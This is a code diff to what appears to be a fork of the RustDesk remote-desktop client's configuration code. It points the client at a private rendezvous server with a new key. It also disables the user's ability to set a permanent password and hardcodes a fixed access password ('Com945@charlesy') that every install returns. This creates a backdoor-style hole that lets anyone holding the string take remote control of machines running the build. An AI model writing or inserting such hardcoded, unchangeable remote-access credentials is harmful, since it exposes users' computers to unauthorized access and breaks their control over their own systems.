@@ -100,8 +100,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["10.111.255.0"];
+pub const RS_PUB_KEY: &str = "nqnRbXql8EYcz9O6wKNSPw+7FcDIKdgNZGmPnwjXM08=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -1039,32 +1039,36 @@ impl Config {
         log::info!("id updated from {} to {}", id, new_id);
     }
 
+    //prohibit user setted password
     pub fn set_permanent_password(password: &str) {
-        if HARD_SETTINGS
-            .read()
-            .unwrap()
-            .get("password")
-            .map_or(false, |v| v == password)
-        {
-            return;
-        }
-        let mut config = CONFIG.write().unwrap();
-        if password == config.password {
-            return;
-        }
-        config.password = password.into();
-        config.store();
-        Self::clear_trusted_devices();
+        // if HARD_SETTINGS
+        //     .read()
+        //     .unwrap()
+        //     .get("password")
+        //     .map_or(false, |v| v == password)
+        // {
+        //     return;
+        // }
+        // let mut config = CONFIG.write().unwrap();
+        // if password == config.password {
+        //     return;
+        // }
+        // config.password = password.into();
+        // config.store();
+        // Self::clear_trusted_devices();
+        return;
     }
 
+    //set permanent password to be fixed
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        // let mut password = CONFIG.read().unwrap().password.clone();
+        // if password.is_empty() {
+        //     if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
+        //         password = v.to_owned();
+        //     }
+        // }
+        const FIXED_PWD: &str = "Com945@charlesy";
+        FIXED_PWD.to_string()
     }
 
     pub fn set_salt(salt: &str) {
